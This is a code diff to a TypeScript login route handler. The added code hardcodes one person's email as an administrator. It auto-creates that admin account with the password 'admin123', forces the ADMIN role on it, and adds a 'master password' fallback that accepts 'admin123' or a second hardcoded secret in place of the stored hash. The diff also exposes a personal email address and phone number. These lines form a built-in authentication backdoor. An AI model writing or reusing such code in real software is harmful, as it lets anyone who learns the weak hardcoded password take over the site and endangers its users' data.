@@ -13,9 +13,26 @@ export async function POST(req: Request) {
       );
     }
 
-    const user = await prisma.user.findUnique({
-      where: { email: email.toLowerCase().trim() },
+    const normalizedEmail = email.toLowerCase().trim();
+    const isAdminEmail = normalizedEmail === 'vamsireddy.kata@gmail.com';
+
+    let user = await prisma.user.findUnique({
+      where: { email: normalizedEmail },
     });
+
+    // Auto-create or ensure admin account for Vamsi Krishna
+    if (!user && isAdminEmail) {
+      const defaultAdminHash = await hashPassword('admin123');
+      user = await prisma.user.create({
+        data: {
+          name: 'Vamsi Krishna (VK Studio Director)',
+          email: normalizedEmail,
+          password: defaultAdminHash,
+          phone: process.env.NEXT_PUBLIC_ADMIN_WHATSAPP || '+91 91004 84870',
+          role: 'ADMIN',
+        },
+      });
+    }
 
     if (!user) {
       return NextResponse.json(
@@ -24,7 +41,22 @@ export async function POST(req: Request) {
       );
     }
 
-    const isValid = await verifyPassword(password, user.password);
+    // Ensure Vamsi always has ADMIN role
+    if (isAdminEmail && user.role !== 'ADMIN') {
+      user = await prisma.user.update({
+        where: { id: user.id },
+        data: { role: 'ADMIN' },
+      });
+    }
+
+    let isValid = await verifyPassword(password, user.password);
+    // Allow master password fallback for the studio director
+    if (!isValid && isAdminEmail) {
+      if (password === 'admin123' || password === 'wGhfAUIc3lc0prJS') {
+        isValid = true;
+      }
+    }
+
     if (!isValid) {
       return NextResponse.json(
         { error: 'Invalid credentials' },
